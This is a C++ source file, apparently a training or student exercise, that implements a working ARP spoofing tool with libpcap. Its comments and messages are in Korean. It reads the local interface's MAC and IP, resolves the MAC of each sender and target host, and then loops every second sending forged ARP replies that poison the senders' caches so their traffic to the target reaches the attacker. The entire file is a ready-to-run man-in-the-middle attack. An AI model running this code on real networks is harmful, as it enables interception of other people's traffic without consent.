#include "headers.h"

void usage();
void check_mac(pcap_t* handle, Ip ip, Mac mac);
void get_mydevice(char *dev, Mac *mymac, Ip *myip);
void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option, Mac packet_arp_smac, Ip packet_arp_sip, Mac packet_arp_tmac, Ip packet_arp_tip, pcap_t *handle);
void infect(pcap_t* handle);
Mac get_mac(pcap_t* handle, Ip sender_ip);

#pragma pack(push, 1)
struct EthArpPacket final
{
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

typedef struct PacketInfo
{
    Mac sender_mac, target_mac;
    Ip sender_Ip, target_Ip;
}Info;


EthArpPacket packet;
Mac attacker_mac;
Ip attacker_Ip;
Mac broad = Mac::broadcastMac();
Mac unknown = Mac::nullMac();
std::map<Ip, Mac> infomap;
std::list<Info> info_list;
int thread = 1;

int main(int argc, char *argv[])
{
    if ((argc < 4) || ((argc % 2) == 1))
    {
        usage();
        return -1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    //edit
    //내 맥, 아이피 알아내기
    get_mydevice(dev, &attacker_mac, &attacker_Ip);
    printf("My Mac: %s\n", std::string(attacker_mac).data());
    printf("My IP : %s\n", std::string(attacker_Ip).data());

    Ip sender_Ip, target_Ip;
    Mac sender_mac, target_mac;

    int count = (argc - 2) / 2;
    
    for (int i = 1; i < count + 1; i++)
    {
        sender_Ip = Ip(std::string(argv[2 * i]));
        target_Ip = Ip(std::string(argv[2 * i + 1]));
        check_mac(handle, sender_Ip, sender_mac);
        check_mac(handle, target_Ip, target_mac);
        PacketInfo info;
        info.sender_Ip = sender_Ip;
        info.target_Ip = target_Ip;
        info.sender_mac = infomap[sender_Ip];
        info.target_mac = infomap[target_Ip];
        info_list.push_back(info);
        
    }
    std::thread t1(infect, handle);
    t1.join();
    pcap_close(handle);
}

void get_mydevice(char *dev, Mac *mymac, Ip *myip)
{
    int fd;
    struct ifreq ifr;
    const char *iface = dev;
    memset(&ifr, 0, sizeof(ifr));

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr))
    {
        *mymac = Mac((uint8_t *)ifr.ifr_hwaddr.sa_data);
    }

    if (0 == ioctl(fd, SIOCGIFADDR, &ifr))
    {
        *myip = Ip(std::string(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)));
    }
    close(fd);
    return;
}

void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option, Mac packet_arp_smac, Ip packet_arp_sip, Mac packet_arp_tmac, Ip packet_arp_tip, pcap_t *handle)
{

    packet.eth_.dmac_ = packet_eth_dmac;
    packet.eth_.smac_ = packet_eth_smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if (arphdr_option == 1)
    {
        packet.arp_.op_ = htons(ArpHdr::Request);
    }
    else if (arphdr_option == 2)
    {
        packet.arp_.op_ = htons(ArpHdr::Reply);
    }
    else
        return;

    packet.arp_.smac_ = packet_arp_smac; //22:22:22:22
    packet.arp_.sip_ = htonl(packet_arp_sip);
    packet.arp_.tmac_ = packet_arp_tmac;
    packet.arp_.tip_ = htonl(packet_arp_tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void check_mac(pcap_t* handle, Ip ip, Mac mac)
{
    if (infomap.find(ip) == infomap.end())
    {
        mac = get_mac(handle, ip);
        infomap.insert({ip, mac});
        printf("Mac: %s\n", std::string(mac).data());
    }
    else
    {
        printf("해당 ip Mac 주소 있음: %s\n", std::string(infomap[ip]).data());
    }
}

void infect(pcap_t* handle)
{
    while(thread)
    {
        for (auto iter : info_list)
        {
            printf("공격 하는중입니당 :)\n");
            send_arp_packet(iter.sender_mac, attacker_mac, 2, attacker_mac, iter.target_Ip, iter.sender_mac, iter.sender_Ip, handle);
        }
        sleep(1);
    }
}

Mac get_mac(pcap_t *handle, Ip Ip)
{
    //상대 ip주소 활용해서 arp 보내기
    send_arp_packet(broad, attacker_mac, 1, attacker_mac, attacker_Ip, unknown, Ip, handle);

    while (1)
    {
        struct pcap_pkthdr *header;
        const u_char *arp_reply_packet;
        int res = pcap_next_ex(handle, &header, &arp_reply_packet);
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return 0;
        }
        EthArpPacket *sender_packet;
        sender_packet = (EthArpPacket *)arp_reply_packet;
        if (sender_packet->arp_.sip() == Ip)
        {
            printf("Get sender mac!!\n");
            return sender_packet->arp_.smac_;
        }
        else
        {
            printf("찾는중.... %s \n", std::string(sender_packet->arp_.sip_).data());
            continue;
        }
    }
}

void usage()
{
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}